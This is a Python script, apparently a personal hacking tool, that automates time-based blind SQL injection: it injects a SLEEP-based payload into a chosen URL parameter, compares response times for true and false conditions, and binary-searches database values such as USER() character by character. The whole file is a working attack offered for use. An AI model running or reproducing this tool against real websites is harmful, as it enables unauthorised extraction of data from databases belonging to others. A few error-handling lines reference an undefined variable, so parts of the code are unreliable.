#!/usr/bin/python3

#
# ./blind_binsearch.py http://localhost "%' AND {} OR SLEEP(1) OR '%" "USER()"
#

import argparse
import random
import requests
from functools import reduce
import datetime
import sys
#
# Setup
#

parser = argparse.ArgumentParser(description="Semi-automated timing based bind SQL injection (over ASCII)")

# parser.add_argument("-d", help="The delay between requests, in milliseconds (default 1000ms). Set to 0 for no delay", default=1000, type=int, metavar="delay")
parser.add_argument("target", help="The target as a url.")
parser.add_argument("param", help="The injectible parameter.")
parser.add_argument("base_query", help="The base SQL statement to use.")
parser.add_argument("var", help="The variable you want to test.")
# parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode. Don't show progress word or error messages.")
# parser.add_argument("--no-errors", action="store_true", help="Supress error messages.")
# parser.add_argument("--yes-errors", action="store_true", help="Show error messages, even when in quiet mode.")
# parser.add_argument("--no-progress", action="store_true", help="Don't show the progress word.")
# parser.add_argument("--yes-progress", action="store_true", help="Show the progress word, even when in quiet mode.")

args = vars(parser.parse_args())

#
# Globals
#

TIMING_QUERIES = 1

#
# Functions
#

def binsearch(is_leq_curr, bot, top):
    while top != bot:
        curr = (top-bot) // 2 + bot

        if is_leq_curr(curr):
            bot=curr+1
        else:
            top=curr

    return top

class ActiveInjection:
    """
    An injection which we know the timings of.
    """

    def __init__(self, target, param, base_query, var):
        self.target = target
        self.param = param
        self.base_query = base_query
        self.var = var

        true_q = self.base_query.format("TRUE")
        false_q = self.base_query.format("FALSE")

        true_queries = map(lambda _: self.send_sql_query(true_q), range(0, TIMING_QUERIES))
        true_good_responses = filter(lambda r: r.ok, true_queries)
        true_deltas = list(map(lambda res: res.elapsed, true_good_responses))
        if not true_deltas:
            code = queries[0].status_code
            raise Exception("Not enough good responses: "+str(code)) # TODO custom exception
        average_true = reduce(lambda a,x: a+x, true_deltas, datetime.timedelta(0)) / TIMING_QUERIES

        false_queries = map(lambda _: self.send_sql_query(false_q), range(0, TIMING_QUERIES))
        false_good_responses = filter(lambda r: r.ok, false_queries)
        false_deltas = list(map(lambda res: res.elapsed, false_good_responses))
        if not false_deltas:
            code = queries[0].status_code
            raise Exception("Not enough good responses: "+str(code)) # TODO custom exception
        average_false = reduce(lambda a,x: a+x, false_deltas, datetime.timedelta(0)) / TIMING_QUERIES

        self.true_delta = average_true
        self.false_delta = average_false

    def closest_delta_bool(self, delta):
        return abs(self.true_delta - delta) > abs(self.false_delta - delta)

    def send_sql_query(self, query):
        return requests.get(self.target, params={self.param: query})

    def get_str_len(self):
        var = 'LENGTH({})'.format(args["var"])
        return binsearch(lambda x: self.sql_leq(x, var), 0, 1000)

    def get_str(self):
        out = "" # TODO mutable string?

        str_len = self.get_str_len()

        sys.stdout.write(u"\u001b[1000D"+out+ "?"*(str_len) )
        sys.stdout.flush()

        for i in range(1,str_len+1):
            var = "MID({}, {}, 1)".format(args["var"], i)

            res = binsearch(lambda x: self.sql_leq_char(x, var), 0x01, 0x7f)
            out += chr(res)

            sys.stdout.write(u"\u001b[1000D"+out+ "?"*(str_len-i) )
            sys.stdout.flush()

        sys.stdout.write("\n")
        sys.stdout.flush()

        return out

    def sql_leq_char(self, curr, var):
        return self.sql_leq("'{}'".format(chr(curr)), var)

    def sql_leq(self, curr, var):
        condition = "{} <= {}".format(var, curr)
        query = self.base_query.format(condition)
        response = self.send_sql_query(query)

        return self.closest_delta_bool(response.elapsed)

#
# Main
#

a = ActiveInjection(args["target"], args["param"], args["base_query"], args["var"])
a.get_str()
